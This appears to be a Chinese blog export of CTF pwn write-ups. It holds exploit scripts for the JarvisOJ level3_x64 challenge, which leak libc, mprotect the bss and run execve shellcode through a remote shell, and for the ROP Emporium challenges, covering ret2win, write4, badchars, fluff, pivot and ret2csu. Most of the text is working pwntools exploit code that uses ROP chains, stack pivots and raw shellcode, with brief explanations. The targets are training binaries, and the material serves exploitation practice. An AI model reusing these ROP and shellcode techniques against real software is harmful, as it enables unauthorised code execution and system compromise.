思路：（1）先通过write函数leak出write（也可以是其他）的真实地址（2）找到mprotect的真实地址（3）将shellcode写入bss段（4）调用mprotect将bss段权限更改（5）调用bss，getshell 第一段的代码：（leak write_addr，found mprotect_addr） 第二段（shellcode写入bss） 第三段（找两个空的got地址，将mprotect和bss写入方便调用） 最后就直接通过csu调用bss段就可以getshell了，（很奇怪的是本地get不到，远程可以） 两种方法的exp第一种（写个函数，直接调用） 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level = "debug"sh=remote('pwn2.jarvisoj.com',9884)#sh = process('./level3_x64')elf =ELF('./level3_x64')libc = ELF('./libc-2.19.so')vul = elf.symbols['vulnerable_function']#read_plt = elf.symbols['read']read_got = elf.got['read']read_libc = libc.symbols['read']mprotect_libc = libc.symbols['mprotect']write_libc = libc.symbols["write"]write_got = elf.got['write']#write_plt = elf.plt['write']#bss = 0x0600A88bss = elf.bss()#gadgetpop5_addr = 0x04006A6mov_call = 0x0400690 bss_got = 0x0600A48mprotect_got = 0x0600A50def csu(r12,r13,r14,r15,data=False): data_num='' payload = "a"*0x88 payload += p64(pop5_addr)+p64(0)+p64(0)+p64(1)+p64(r12)+p64(r13)+p64(r14)+p64(r15) payload += p64(mov_call)+"a"*0x38 payload += p64(vul) sh.recvuntil("Input:\n") sh.send(payload) if data==True: data_num = u64(sh.recv(8)) return data_numread_addr = csu(write_got,8,read_got,1,True)mprotect_addr = read_addr - read_libc + mprotect_libcprint "mprotect_addr:" + hex(mprotect_addr)read_got = elf.got['read']bss = elf.bss()shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'csu(read_got,len(shellcode),bss,0)sh.send(shellcode)mprotect_got = 0x0600A50csu(read_got,8,mprotect_got,0)sh.send(p64(mprotect_addr))csu(mprotect_got,7,0x1000,0x600000)bss_got = 0x0600A48csu(read_got,8,bss_got,0)sh.send(p64(bss))csu(bss_got,0,0,0)sh.interactive() 第二种（用pop rdi，rsi，rdx来存参） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *sh =remote('pwn2.jarvisoj.com',9884)#sh = process('./level3_x64')elf = ELF("./level3_x64")libc = ELF("./libc-2.19.so")#write_plt = 0x04004B0write_plt = elf.plt["write"]write_got = elf.got["write"]vul = elf.symbols["vulnerable_function"]#bss = 0x0600A88bss_base = elf.bss()read_plt = elf.symbols["read"]read_got = elf.got["read"]write_libc = libc.symbols["write"]mprotect_libc = libc.symbols["mprotect"]#gadgetpop_rdi = 0x00000000004006b3 #the first parameterpop_rsi_rdx = 0x00000000004006b1 #the second and third pop5_addr = 0x00000000004006A6mov_call = 0x0000000000400690 #distence 0x1apayload1 = "a"*0x80 + p64(0)payload1 += p64(pop_rdi)+p64(1)+p64(pop_rsi_rdx)+p64(write_got)+p64(0)+p64(write_plt)+p64(vul)sh.recv()sleep(0.2)sh.send(payload1)data = sh.recv(8)write_addr = u64(data)libc_dis = write_addr - libc.symbols["write"]mprotect_addr = libc_dis + libc.symbols["mprotect"]read_plt = elf.symbols["read"]bss_base = elf.bss()pop_rdi = 0x00000000004006b3 #the first parameterpop_rsi_rdx = 0x00000000004006b1 #the second and third #shellcode = asm(shellcraft.sh())shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'payload2 = "a"*0x80 + p64(0)payload2 += p64(pop_rdi)+p64(0)+p64(pop_rsi_rdx)+p64(bss_base)+p64(0)+p64(read_plt)+p64(vul)sleep(0.2)sh.send(payload2)sleep(0.2)sh.send(shellcode)bss_got = 0x0000000000600A48payload4 = "a"*0x80 + p64(0)payload4 += p64(pop_rdi)+p64(0)+p64(pop_rsi_rdx)+p64(bss_got)+p64(0)+p64(read_plt)+p64(vul)sleep(0.2)sh.send(payload4)sleep(0.2)sh.send(p64(bss_base)) mprotect_got = 0x0000000000600A50payload3 = "a"*0x80 +p64(0)payload3 += p64(pop_rdi)+p64(0)+p64(pop_rsi_rdx)+p64(mprotect_got)+p64(0)+p64(read_plt)+p64(vul)sleep(0.2)sh.send(payload3)sleep(0.2)sh.send(p64(mprotect_addr))pop_rdi = 0x00000000004006b3 #the first parameterpop_rsi_rdx = 0x00000000004006b1 #the second and third payload5 = 'a'*0x80+p64(0)payload5 += p64(pop5_addr) + p64(0) + p64(0) + p64(1) +p64(mprotect_got) + p64(7) +p64(0x1000)+p64(0x600000)payload5 +=p64(mov_call) payload5 += 'a'*8 + p64(0) + p64(1) + p64(bss_got) + p64(0) + p64(0) + p64(0)payload5 += p64(mov_call)sleep(0.2)sh.send(payload5)sh.interactive()` 权限为7，可读可写可执行，长度为0x1000，改0x600000-0x601000段的执行权限找了一下午的bug，代码改得有点乱（终于cat到flag也是好心酸的）。]]></content>
  </entry>
  <entry>
    <title><![CDATA[ROP Emporium]]></title>
    <url>%2F2019%2F07%2F08%2FROP%20Emporium%2F</url>
    <content type="text"><![CDATA[这里是ROP Emporium的题的exp，然后由于我太懒，exp都是64位的，32位的还没写。 1-ret2win12345678910111213# -*- coding:utf-8 -*-from pwn import *sh = process('./ret2win')shell=0x0400824bss = 0x0601060payload = 0x20*"a" + p64(0) + p64(shell)sh.sendline(payload)sh.interactive() 2-split12345678910111213# -*- coding:utf-8 -*-from pwn import *sh = process('./split')system = 0x04005E0cat_flag = 0x0601060bss = 0x0601080pop_rdi = 0x0400883payload = "a"*0x20 + p64(0) + p64(pop_rdi) + p64(cat_flag) + p64(system)sh.sendline(payload)sh.interactive() 3-callme题目意思大概是叫我们分别调用callme_one callme_two callme_three来得到flag，要想知道这些函数到底是干什么的还是要去.so文件里看一下具体的函数（其实主要是它竟然给了我们一个.so文件，那肯定不会没用啊，而且callme里对这三个函数就是一笔带过，啥都没写） so里的三个函数传的参都是1、2、3，意思就是我们要把这些参数压进栈内，然后调用callme的三个函数，但是貌似每次调用都要传参，才能调用到下一个函数，所以我们要pop三个寄存器出来存着三个数 然后找到rdi rsi rdx三个可以用的接下来上脚本 123456789101112131415161718# -*- coding:utf-8 -*-from pwn import *sh = process('./callme')callme_one = 0x0401850callme_two = 0x0401870callme_three = 0x0401810pop_rdi_rsi_rdx = 0x0401ab0 #wirte 1/2/3 in callmepayload = "a"*0x20 + p64(0)payload += p64(pop_rdi_rsi_rdx)+p64(1)+p64(2)+p64(3)+p64(callme_one)payload += p64(pop_rdi_rsi_rdx)+p64(1)+p64(2)+p64(3)+p64(callme_two)payload += p64(pop_rdi_rsi_rdx)+p64(1)+p64(2)+p64(3)+p64(callme_three)sh.sendline(payload)sh.interactive() 32位不需要调用rdi来存放指令，但是它需要用到堆栈平衡，在调用函数之后的栈帧里，存的是它的返回地址，而后面是调用函数的参数。（这里就没写exp）但64位需要用到rdi，rsi，rdx来存参，参数在调用前进栈，存入相应位置。 4-write4首先，我们明确一下思路，是要将”/bin/sh”写入bss段里。借助pop 然后我们选那个r14、r15的地址然后还要去找mov的地址来给寄存器赋值的 然后我们找到有r14和r15的，[r14]是代表r14的地址，r15则是对应的值，假设r14地址为0x0401809，r15里的值是“abc”，则这个命令就是，让r14里的地址指向r15里的内容，即0x0401809-&gt;“abc”。 123456789101112131415161718# -*- coding:utf-8 -*-from pwn import *sh = process('./write4')system = 0x04005E0pop_rdi = 0x0400893 bss = 0x0601060pop_r14_r15 = 0x0400890 mov_r14_r15 = 0x0400820 payload = "a"*0x20+p64(0)payload += p64(pop_r14_r15) + p64(bss) + "/bin/sh\x00" + p64(mov_r14_r15) #save the /bin/sh into bsspayload += p64(pop_rdi) + p64(bss) + p64(system) #rdi-&gt;system bss is the x in systemsh.sendline(payload)sh.interactive() 5-badchars通过程序我们知道，它阻止了几个字符的输入，使个别字符强行转换成21（会影响“/bin/sh”的写入），所以我们要绕过它 最简单的加密解密方法就是异或了，我们来找一个数字，使输入异或之后不等于badchars即可，脚本如下 123456789101112131415161718# -*- coding: utf-8 -*-from pwn import *chars = [98,105,99,47,32,102,110,115]num = 1binsh = "/bin/sh\x00"while 1: for i in binsh: x = ord(i) ^ num if x in chars: num += 1 break if i == "\x00": print num num += 1 if num == 10: break 我们选用2然后我们就可以写exp了 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *sh = process('./badchars')binsh = "/bin/sh\x00"num = ""for x in binsh: num += chr(ord(x)^2)system = 0x04006F0 bss = 0x0601080 pop_rdi = 0x0400b39 mov_r12_r13 = 0x0400b34 pop_r12_r13 = 0x0400b3b #write num in bsspop_r14_r15 = 0x0400b40xor_r15_r14 = 0x0400b30 #back to binshpayload = "a" * 0x20 + p64(0)payload += p64(pop_r12_r13) + num + p64(bss) + p64(mov_r12_r13)#back to binshfor i in range(0,len(num)): payload += p64(pop_r14_r15) + p64(2) + p64(bss+i) payload += p64(xor_r15_r14)payload += p64(pop_rdi) + p64(bss) + p64(system)sh.sendline(payload)sh.interactive() 6-fluff这个和前面的write4有异曲同工之处，只不过这个程序没有那么多的mov，需要借助到xor（xor自身会清空，xor另一个数，就等于存值） 123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env python# -*- coding:utf-8 -*-from pwn import *sh = process('./fluff')system = 0x04005E0bss = 0x0601060pop_rdi = 0x04008c3 pop_r12 = 0x04008bc#pop r12 ; pop r13 ; pop r14 ; pop r15 ; retxor_r11_r11 = 0x0400822# xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; retxor_r11_r12 = 0x040082f# xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; retxchg_r11_r10 = 0x0400840# xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; retmov_r10_r11 = 0x040084e# mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; retpayload = "a"*0x20 + p64(0)payload += p64(pop_r12) + p64(bss) + p64(0) + p64(0) + p64(0) payload += p64(xor_r11_r11) + p64(0) payload += p64(xor_r11_r12) + p64(0)payload += p64(xchg_r11_r10) + p64(0) payload += p64(pop_r12) + "/bin/sh\x00"+ p64(0) + p64(0) + p64(0) payload += p64(xor_r11_r11) + p64(0)payload += p64(xor_r11_r12) + p64(0) payload += p64(mov_r10_r11) + p64(0) + p64(0) payload += p64(pop_rdi) + p64(bss) + p64(system)sh.sendline(payload)sh.interactive() 7-pivot这个貌似有用到栈迁移的东西，这个程序有两个输入，第一个是写到堆里（它给出了堆的地址），第二个是写入到栈里。很明显第二次能输入的内容太少，所以payload写入堆里，然后在栈里调用。 .so里有一个后门函数，可以直接调用ret2win，cat到flag。而要leak真实地址的话要找两个文件都有的函数，貌似是只有foothold_function函数#函数需要经过一次调用之后got表里才会有真实地址 1234567891011121314151617181920212223242526272829303132333435363738394041424344#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *sh = process('./pivot')libc = ELF('./libpivot.so')foothold_function_so = libc.symbols['foothold_function']ret2win = libc.symbols['ret2win']foothold_function_plt = 0x0400850foothold_function_got = 0x0602048offest = ret2win - foothold_function_so#gadgetpop_rax = 0x0400b00mov_rax_addr = 0x0400b05pop_rbp = 0x0400900pop_rdi = 0x0400b73call_rax = 0x040098eadd_rax_rbp = 0x0400b09xchg_rax_rsp = 0x0400b02sh.recvuntil("The Old Gods kindly bestow upon you a place to pivot: ")heap_addr = int(sh.recv(14),16)payload1 = p64(foothold_function_plt) + p64(pop_rax) + p64(foothold_function_got) + p64(mov_rax_addr)payload1 += p64(pop_rbp) + p64(offest) + p64(add_rax_rbp) + p64(call_rax)payload2 = "a"*0x20 + p64(0)payload2 += p64(pop_rax) + p64(heap_addr) + p64(xchg_rax_rsp)sh.recvuntil("&gt; ")sh.sendline(payload1)sh.recvuntil("&gt; ")sh.sendline(payload2)sh.recvuntil("into libpivot.so") #foothold_function() in libpivot.so print this sentencesh.interactive() 8-ret2csu1234567891011121314151617181920212223#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *sh = process('./ret2csu')gdb.attach(sh)system = 0x04005A0ret2win = 0x04007B1init = 0x0600E18 #self init/fini#gadget pop5_addr = 0x040089A #pop_rbx_rbp_r12_r13_r14_r15mov_call = 0x0400880 #mov rdx_r15 rsi_r14 edi_r13d call r12+rbp*8payload = "a"*0x20 + p64(0)payload += p64(pop5_addr) + p64(0) + p64(1) + p64(init) + p64(0) + p64(0) + p64(0xdeadcafebabebeef)payload += p64(mov_call) + "a"*56 + p64(ret2win)gdb.attach(sh,'b setvbuf')sh.sendline(payload)sh.interactive()]]></content>
  </entry>
</search>
